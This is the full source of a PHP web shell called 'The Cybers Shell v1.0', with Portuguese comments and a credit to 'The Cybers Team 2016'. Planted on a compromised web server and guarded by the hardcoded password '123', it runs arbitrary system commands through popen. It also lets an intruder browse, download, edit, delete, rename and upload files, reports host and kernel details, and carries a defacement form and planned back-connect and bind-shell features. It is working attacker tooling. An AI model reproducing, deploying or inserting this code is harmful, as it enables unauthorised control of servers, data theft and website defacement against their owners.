<?php
	session_start();
	$secret = "123";
	// Configuração ==================================================
	if(!$diretorio = $_GET['ls']){
		$diretorio = getcwd();
	}

	if($_POST['senha'] == $secret){
	$_SESSION['login'] = 1;
	}

	if($_GET['logout']){
		$_SESSION['login'] = 0;
	}

?>
<!DOCTYPE html>
<html>
<head>
	<title>The Cybers Shell [v1.0]</title>
	<meta charset="utf-8">
<style>

body{
	background-color: #090909;
	margin:0; padding:0;
	color:#eee;
}


<?php
if(!$_SESSION['login']){
echo"
#login img{
	width:150px;
	margin-left:50px;
}
#login form{
	margin:0 auto;
	width:250px;
}
#login h2{
	text-align: center;
}
#login input{
	padding:5px;
	border: solid 1px #111;
	background-color:#111;
	margin:2px 0 2px 0;
}
#login input:focus{
	border: solid 1px red;
}
#login #senha{
	width:238px;
}
#login #entrar{
	width:100%;
}
#login #entrar:hover{
	width:100%;
	cursor:pointer;
	background-color:#222;
	color:white;
}
";
}
else{
echo "

h2 a{
	text-decoration: none;
}

#rodape{
	color:#aaa;text-decoration: none;
}
#rodape:hover{
	color: white;
}

#upar{
	padding: 8px;
}

input{
	padding:5px;
	border: solid 1px #111;
	background-color:#111;
}

input:hover{
	cursor:pointer;
	background-color:#222;
	color:white;
}

.container{
	width:98%;
	margin:0 auto;
}
tr:hover{
	background-color:#333;
}
nav{
	float:right;
	text-align: center;
	/background-color:#111;
	width:350px;
	height:50px;
}
li{
	display: inline-block;
	width:100px;
}
li:hover{
	color:red;
	cursor:pointer;
}
table{
	width:100%;
	background-color:#141414;
	border-radius: 5px;
	border: 1px solid #222;
	border-spacing: 0px;
}
body, h1 a{
	text-decoration: none;
}
th,td{
	text-align: left;
	width:200px;
}
form{
	padding:5px;
	margin-top:10px;
	margin-bottom:10px;
	border-radius: 5px;
}
a{
	color:red;
}
.check{
	width:30px;
}
#info{
	border: solid 1px #222;
	background-color:#111;
	width:400px;
	float:left;
	margin-top:10px;
	padding:5px;
}

#logo{
	/border: solid 1px blue;
	width:400px;
	float:left;
}

#shell{
	float: left;
	width: 100%;
}

section{
	background-color: #141414;
	border-radius: 5px;
	border: 1px solid #222;
	width:100%;
}

section header{
	padding:10px;
	background-color: #222;
}

section article{
	padding:10px;
}

";
}
?>
</style>
</head>
<body>
<div class="container">
<?php
if(!$_SESSION['login']){
	login();
}
else{
	painel($diretorio);
}

/*
	By: The Cybers Team
	Versão: v1.0

	OLD!!!

	[ok] listar
	[no] visualizar
	[ok] download
	[ok] editar
	[ok] deletar
	[ok] upload
	[ok] navegar
	[ok] executar
	[ok] renomear
	[ok] criar
	[no] hint bar
	[ok] novo arquivo
	[ok] permissoes
	[no] gerar deface
	[ok] comandos
	

	IMPORTANTE!!!

	[ok] - Login
	- Navegar nos diretorios
	- Upload de arquivo
	- Editar arquivo
	- Deletar arquivo
	- Renomear arquivo
	- Listar arquivos
	- Versão do kernel
	- Ip do servidor
	- Nome do host
	- Executar comandos
	- Back connect
	- Bind connect
	- Auto destruir



*/

	// Funções =======================================================

function painel($diretorio){
echo "<header>";
echo "<div id='info'>";
echo "<small>Kernel: ";echo php_uname('r');echo"</small><br />";
echo "<small>Machine: ";echo php_uname('m');echo"</small><br />";
echo "<small>Os: ";echo php_uname('n');echo"</small><br />";
echo "<small>Ip: $_SERVER[REMOTE_ADDR]</small><br />";
echo "<small>Host: $_SERVER[HTTP_HOST]</small><br />";
echo "</div>";
echo "
</header>
<center>

<div id='logo'>
	<img style='width:100px' src='Logo.png'>
	<h2><a href='shell.php' title='Home'>The Cybers Shell</a></h2>
</div>
</center>
<nav>
	<ul>
		<li><a href='shell.php'>Arquivos</a></li>
		<li><a href='?pag=comandos'>Comandos</a></li>
		<li><a href='?pag=info'>Info</a></li>
	</ul>
</nav>
";

echo "<div id='shell'>";

$page = $_GET['pag'];
if($page == 'comandos'){

	echo "
		<section>
			<header>Comandos</header>
			<article>
			";
			if($cmd = $_GET['cmd']){
				cmd($cmd, $diretorio);
			}
			executar();
			echo"
			</article>
		</section>
	";
}

else if($page == 'info'){
		echo "
		<section>
			<header>Informações</header>
			<article>
			informações aqui...
			</article>
		</section>
	";
}

else{
	listar($diretorio);	
}

// echo "
// <form method='post'>
// 	<input name='logout' type='submit' value='Logout'>
// </form>
// ";
echo "<center><a id='rodape' href='http://www.fb.com/TheCybersTeam' title='Coded by OFFSET'>The Cybers Team 2016</a></center>";

echo "</div>";
}

function login(){
	echo "
	<div id='login'>
		<form method='post'>
			<h2>The Cybers Shell</h2>
			<img src='Logo.png'>
			<label>Senha:</label><br/>
			<input id='senha' type='password' name='senha'>
			<input id='entrar' type='submit' value='Entrar'>
		</form>	
	</div>
	";	
}


	function permissao($arquivo){
		$perms = fileperms($arquivo);
		if(($perms&0xC000)==0xC000)$info='s';
		elseif(($perms&0xA000)==0xA000)$info='l';
		elseif(($perms&0x8000)==0x8000)$info='-';
		elseif(($perms&0x6000)==0x6000)$info='b';
		elseif(($perms&0x4000)==0x4000)$info='d';
		elseif(($perms&0x2000)==0x2000)$info='c';
		elseif(($perms&0x1000)==0x1000)$info='p';
		else $info='u';
		$info.=($perms&0x0100)?'r':'-';
		$info.=($perms&0x0080)?'w':'-';
		$info.=($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-');
		$info.=($perms&0x0020)?'r':'-';
		$info.=($perms&0x0010)?'w':'-';
		$info.=($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-');
		$info.=($perms&0x0004)?'r':'-';
		$info.=($perms&0x0002)?'w':'-';
		$info.=($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-');
		return $info;
	}
	function anterior($dir){
		$dir = explode("/",$dir);
		unset($dir[count($dir)-1]);
		if($dir[1] == ""){
			$dir[0] = "/";
		}
		return implode("/",$dir);
	}
	function listar($dir){
		$anterior = anterior($dir);
		// echo "
		// 	<form action='shell.php' method='GET'>
		// 		<input type='hidden' name='novo' value='$dir'/>
		// 		<input type=submit value='Novo arquivo'></input>
		// 	</form>
		// ";
		echo "
			<table>
				<tr style='background-color:#222'>
					<th class='check'><input type=checkbox></input></th>
					<th>Arquivo</th>
					<th>Permissão</th>
					<th>Tamanho</th>
					<th>Ações</th>
				</tr>
		";
		foreach(scandir($dir) as $nome){
			$file = "$dir/$nome";
			if($nome ==".."){
				echo "<tr>";
				echo "<td class='check'></td>";
				echo "<td><a href=?ls=$anterior title='Voltar diretorio'>..</a></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "</tr>";	
			}
			if(!is_file($file) and $nome != ".." and $nome != "."){
				echo "<tr>";
				echo "<td class='check'><input type=checkbox name='ckeck[]' value='$dir/$nome'></input></td>";
				echo "<td><a href=?ls=$file>$nome</a></td>";
				echo "<td>".permissao("$dir/$nome")."</td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "</tr>";
			}
			if($nome != "." && $nome !=".." && is_file($file)){
				echo "<tr>";	
				echo "<td class='check'><input type=checkbox name='ckeck[]' value='$dir/$nome'></input></td>";
				echo "<td>".$nome."</td>";
				echo "<td>".permissao("$dir/$nome")."</td>";
				echo "<td>".filesize($file)." bytes</td>";
				echo "<td>
					<a href='?download=$file' title='Baixar'>B</a>
					<a href='?renomear=$nome&pasta=$dir' title='Renomear'>R</a>
					<a href='?editar=$file' title='Editar'>E</a>
					<a href='?deletar=$file' title='Deletar'>D</a>
					</td>";
				echo "</tr>";
			}
		}
		echo "</table>";
		upar($diretorio);
	}

	function download($arquivo){
	    header('Content-Type: application/octet-stream');
	    header('Content-Length: '.filesize($arquivo));
	    header('Content-Disposition: filename='.$arquivo);
	    readfile($arquivo);
	    exit();
	}

	function editar($editar){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<input name=arquivo type=hidden value='$editar'>";
		echo "<textarea name=salvar cols=100 rows=10>";
		foreach($arq as $linha){
			echo htmlspecialchars($linha);
		}
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=salvar>";
		echo "</form>";
		exit();
	}

	function renomear($arquivo, $dir){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<input name=pasta type=hidden value='$dir'>";
		echo "<input name=antigo type=hidden value='$arquivo'>";
		echo "<label>Novo nome:</label>";
		echo "<input name=renomear type=text value='$arquivo'>";
		echo "<br />";
		echo "<input type=submit value=renomear>";
		echo "</form>";
		exit();
	}

	function renomea_arquivo($novo, $antigo, $dir){
		rename("$dir/$antigo", "$dir/$novo");
		echo "Arquivo renomeado!";
	}

	function criar($diretorio){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<label>Nome do arquivo:</label><br/>";
		echo "<input type='text' name='nome'/><br/>";
		echo "<input type='hidden' diretorio='$diretorio'/>";
		echo "<label>Conteudo:</label><br/>";
		echo "<textarea name=criar cols=100 rows=10>";
		foreach($arq as $linha){
			echo htmlspecialchars($linha);
		}
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=criar>";
		echo "</form>";
		exit();
	}

	function deface($diretorio){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<label>Nome da team:</label><br/>";
		echo "<input type='text' name='nome'/><br/>";

		echo "<label>Greatz:</label><br/>";
		echo "<input type='text' greatz='nome'/><br/>";

		echo "<input type='hidden' diretorio='$diretorio'/>";
		echo "<label>Mensagem:</label><br/>";
		echo "<textarea name=mensagem cols=100 rows=10>";
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=gerar deface>";
		echo "</form>";
		exit();
	}

	function salvar($dados, $arquivo){
		$fp = fopen($arquivo, "w");
		fwrite($fp,$dados);
		fclose($fp);
	}

	function deletar($arquivo){
		unlink($arquivo);
		echo "Arquivo deletado!";
	}

	function upar($diretorio){
		echo "
		<center>
		<form class=upar enctype='multipart/form-data' action='shell.php' method='post'>
			<input type='file' name='upload'/>
			<input type='hidden' diretorio='$diretorio'/>
			<input id='upar' type='submit' value='Upar!'/>
		</form>
		</center>
		";

	}


	function upload($arquivo, $diretorio){
		if(move_uploaded_file($arquivo['tmp_name'],"$diretorio/$arquivo[name]")){
			echo "Upado com sucesso! :D";
		}
	}

	function navegar($diretorio){
		echo "
		<form class=upar action='shell.php' method='get'>
			<input style='min-width:";echo strlen($diretorio)*10;echo "px' type='text' name='ls' value='$diretorio'/>
			<input type='submit' value='Acessar'/>
		</form>";

	}

	function executar($diretorio){
		echo "
		<form class=upar action='shell.php?' method='get'>
			<input type='hidden' name'diretorio' value='$diretorio'/>
			<input type='hidden' name='pag' value='comandos'/>
			<input style='width:210px' type='text' name='cmd' value=''/>
			<input type='submit' value='Executar'/>
		</form>";

	}

	function cmd($cmd, $diretorio){
		$p = popen("($cmd)2>&1","r");
		while(!feof($p)){
			echo fgets($p,1000)."<br/>";
		}
	}

	// POST e GET ==================================================
	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
		salvar($salvar,$arquivo);
		echo "Arquivo salvo!";
	}
	if($arquivo = $_GET['download']){
		download($arquivo);
	}

	if($editar = $_GET['editar']){
		editar($editar);
	}

	if($deletar = $_GET['deletar']){
		deletar($deletar);
	}

	if($upar = $_FILES['upload']){
		upload($upar, $diretorio);
	}


	if($criar = $_POST['criar'] and $nome = $_POST['nome']){
		salvar($criar, "$diretorio/$nome");
		echo "Arquivo criado!";
	}

	if($renomear = $_GET['renomear'] and $dir = $_GET['pasta']){
		renomear($renomear, $dir);
	}

	if($renomear = $_POST['renomear'] and $pasta = $_POST['pasta'] and $antigo = $_POST['antigo']){
		renomea_arquivo($renomear, $antigo, $pasta);
	}

	if($novo = $_GET['novo']){
		criar($novo);
	}

	if($deface = $_GET['deface']){
		deface($deface);
	}

	if($menu = $_GET['menu']){
		if($menu == "comandos"){
			executar($diretorio);
			exit();
		}
	}

	// Shell =======================================================
	// navegar($diretorio);
	// listar($diretorio);
	?>
	
</div>



</body>
</html>
